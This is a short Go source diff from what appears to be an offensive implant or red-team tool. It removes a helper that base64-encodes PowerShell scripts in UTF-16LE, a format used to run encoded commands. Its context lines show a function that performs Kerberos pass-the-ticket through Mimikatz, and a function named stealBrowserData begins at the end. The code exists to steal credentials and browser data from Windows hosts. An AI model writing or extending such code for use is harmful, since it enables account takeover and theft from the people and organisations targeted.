@@ -12,7 +12,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"syscall"
 	"time"
 )
 
@@ -173,19 +172,6 @@ func kerberosPassTheTicket(ticketB64 string) (string, error) {
 
 	mimikatzCmd := fmt.Sprintf("kerberos::ptt %s", ticketFile)
 	return runMimikatz(mimikatzCmd, "")
-}
-
-func runPSScriptBase64(script string) string {
-	u16, err := syscall.UTF16FromString(script)
-	if err != nil {
-		return ""
-	}
-	uni := make([]byte, len(u16)*2)
-	for i, r := range u16 {
-		uni[i*2] = byte(r)
-		uni[i*2+1] = byte(r >> 8)
-	}
-	return base64.StdEncoding.EncodeToString(uni)
 }
 
 func stealBrowserData(browser string) string {
